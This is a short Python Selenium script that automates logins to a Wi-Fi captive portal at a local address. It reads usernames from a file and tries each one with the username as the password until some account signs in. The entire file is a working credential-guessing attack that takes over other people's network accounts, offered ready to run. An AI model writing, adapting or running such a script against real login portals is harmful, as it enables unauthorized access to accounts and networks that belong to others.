from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import time
import os
os.system("title WIFI LOGIN")

with open("user.txt" , "r") as file:
    users = [line.strip() for line in file if line.strip()]

url = "http://172.16.16.16:8090/httpclient.html"


driver = webdriver.Chrome(
    service=Service(ChromeDriverManager().install())
)

success = False

for USER in users:

    try:
        driver.get(url)

        time.sleep(3)


        username = driver.find_element(By.ID, "username")
        username.clear()
        username.send_keys(USER)


        password = driver.find_element(By.ID, "password")
        password.clear()
        password.send_keys(USER)

        login = driver.find_element(By.ID,"loginbutton")
        login.click()

        time.sleep(5)


        button = driver.find_element(By.ID,"loginbutton")

        if "sign out" in button.text.lower():
            success = True
            break
    except Exception as e:
        print(f"ERROR with {USER}: {e}")

if not success:
    print("No account found")